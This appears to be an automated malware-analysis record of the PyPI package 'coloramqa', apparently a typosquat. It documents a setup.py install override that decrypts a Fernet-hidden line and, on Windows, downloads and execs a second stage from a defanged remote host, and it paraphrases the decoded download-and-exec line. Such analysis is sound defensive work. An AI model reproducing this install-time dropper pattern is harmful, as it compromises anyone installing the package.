# pypi coloramqa@1.0.0

**Source:** pypi_malregistry · **Source label:** malicious · **Released:** not found · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The sdist overrides setuptools' `install` command with `GruppeInstall`, so its `run` method executes during a normal pip install. There is one gate: `os.name == "nt"`. On Windows the method decrypts a Fernet token (key is a literal next to it) and execs the result, which fetches `hxxps://funcaptcha[.]ru/paste2?package=coloramqa`, strips `<pre>` tags and execs the response as Python. On any other OS it falls straight through to the normal `install.run`.

## Execution

- **cmdclass** `cmdclass[install] = GruppeInstall`: runs setup.py; direct_script, decoded_eval, download_then_exec.
- **setup_py** `python setup.py (pip install from sdist)`: runs setup.py; direct_script.

## Gates

| gate | hook | expression | branch | min | behaviours | recipe |
|---|---|---|---|---|---|---|
| g1 | cmdclass | c1 (c1: os == nt) | then | 1 | download, exec_downloaded | os=win32 |

Gate intent: g1 activate/enables/targeting

Grounding: 1 of 1 conditions and 1 of 1 gates from the candidate set.

## Requirements

- network: funcaptcha[.]ru:443 (second stage is fetched over HTTPS and exec'd; if the host is down nothing further runs)
- other: Python modules requests and fernet importable during the build (imported inside the gated block; supplied through setup_requires)

## Behaviour

- Ungated: none
- Gated: download, exec_downloaded

## Notes

- I decoded the Fernet layer with the existing `fernet_exec` decoder (derivation d1). Payload sinks and the second region are cited in the decoded copy.
- The second stage is remote and not in the archive, so whatever it does, and any gates inside it, is not recovered.
- The randomised description, long description and author fields suggest the package was mass-generated. The Windows classifier is not enforced by pip.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "pypi",
    "name": "coloramqa",
    "version": "1.0.0",
    "archive_sha256": "ece0c58b3bee6dc47454482de7e76db1668921074bde61fe828add48f62060cf",
    "source_dataset": "pypi_malregistry",
    "source_label": "malicious",
    "released_at": null,
    "released_at_source": null,
    "sample_path": "pypi_malregistry/pypi/malicious_intent/coloramqa-1.0.0.tar.gz",
    "package_root": "layer0/coloramqa-1.0.0",
    "cluster_key": "e20f92a0d135e7f22c998e0aaa4f4952038b03725b04a99520c2f5280bc2d21d",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "cmdclass",
        "command": "cmdclass[install] = GruppeInstall",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script",
          "decoded_eval",
          "download_then_exec"
        ],
        "silent_failure": false
      },
      {
        "hook": "setup_py",
        "command": "python setup.py (pip install from sdist)",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "setup_requires (dependency tree): ['fernet', 'requests']",
      "setup.py: read in full. The install override hides one line behind exec(Fernet(key).decrypt(token)) with key and token as literals; decoded with the existing fernet_exec decoder (derivation d1). Nothing unread.",
      "Decoded line: exec(requests.get(hxxps://funcaptcha[.]ru/paste2?package=coloramqa).text with <pre> tags stripped). The second stage is remote and not in the package, so any gates inside it are not recoverable.",
      "The setup_py hook only calls setup(); all behaviour is in the cmdclass install override. The classifier 'Operating System :: Microsoft :: Windows' is metadata pip does not enforce, so it is not a manifest gate."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "funcaptcha[.]ru:443",
      "reason": "second stage is fetched over HTTPS and exec'd; if the host is down nothing further runs"
    },
    {
      "axis": "other",
      "value": "Python modules requests and fernet importable during the build",
      "reason": "imported inside the gated block; supplied through setup_requires"
    }
  ],
  "conditions": [
    {
      "id": "c1",
      "category": "os",
      "api": "os.name",
      "operator": "==",
      "value": "nt",
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_f84921a3d7",
          "anchor": {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 448,
            "end_byte": 463,
            "node_type": "comparison_operator",
            "sha256": "03f6fcec9e8705f1",
            "line": 13
          }
        }
      ],
      "provenance": "in_set"
    }
  ],
  "gates": [
    {
      "gate_id": "g1",
      "hook": "cmdclass",
      "expression": "c1",
      "guards": [
        {
          "candidate": "q_f6c7e2a170",
          "site": {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 445,
            "end_byte": 877,
            "node_type": "if_statement",
            "sha256": "2fd2135e8ce1a3cf",
            "line": 13
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c1"
          ]
        }
      ],
      "provenance": "in_set",
      "polarity": "activate",
      "effect": "enables",
      "purpose": "targeting",
      "purpose_reason": "The second-stage download and exec only happens on Windows (os.name == 'nt'); nothing runs on other systems.",
      "then": {
        "min_conditions": 1,
        "behaviours": [
          "download",
          "exec_downloaded"
        ],
        "env_recipe": {
          "os": "win32"
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 481,
            "end_byte": 877,
            "node_type": "block",
            "sha256": "26aa36f5e2a38ff6",
            "line": 14
          },
          {
            "file": "setup.py",
            "derived_from": "d1",
            "start_byte": 481,
            "end_byte": 669,
            "node_type": "stmt_range",
            "sha256": "373089fe87cb77b8",
            "line": 14
          }
        ],
        "payload": [
          {
            "behaviour": "download",
            "sink_kind": "network",
            "sink": {
              "file": "setup.py",
              "derived_from": "d1",
              "start_byte": 560,
              "end_byte": 622,
              "node_type": "call",
              "sha256": "75d933ff9271a008",
              "line": 16
            },
            "witness": []
          },
          {
            "behaviour": "exec_downloaded",
            "sink_kind": "eval",
            "sink": {
              "file": "setup.py",
              "derived_from": "d1",
              "start_byte": 555,
              "end_byte": 669,
              "node_type": "call",
              "sha256": "8ab366980a3e88cc",
              "line": 16
            },
            "witness": []
          }
        ]
      },
      "else": null
    }
  ],
  "behaviours": {
    "ungated": [],
    "gated": [
      "download",
      "exec_downloaded"
    ]
  },
  "obfuscation": {
    "level": "light",
    "techniques": [
      "Fernet-encrypted stage with the key as a literal, exec'd at install",
      "exec of code downloaded at install",
      "random-letter description and author metadata"
    ],
    "decoded": true,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://funcaptcha[.]ru/paste2?package=coloramqa",
        "role": "second_stage"
      }
    ]
  },
  "attack_type": "malicious_new_package",
  "family_hint": "funcaptcha fernet dropper",
  "claude_assessment": "malicious",
  "assessment_reason": "The install override decrypts a Fernet-hidden line that, on Windows only, downloads code from a remote paste endpoint and exec's it during pip install. The override does no legitimate build work.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "setup.py",
          "derived_from": null
        },
        "params": {
          "decoder": "fernet_exec",
          "lang": "py"
        },
        "output_sha256": "136b7a9ab3547f34"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "5850bf20186213e7"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 1,
    "condition_sites_cited": 1,
    "guards_cited": 1,
    "candidates_dropped": 0,
    "conditions_in_set": 1,
    "conditions_out_of_set": 0,
    "guard_candidates": 1,
    "gates_in_set": 1,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
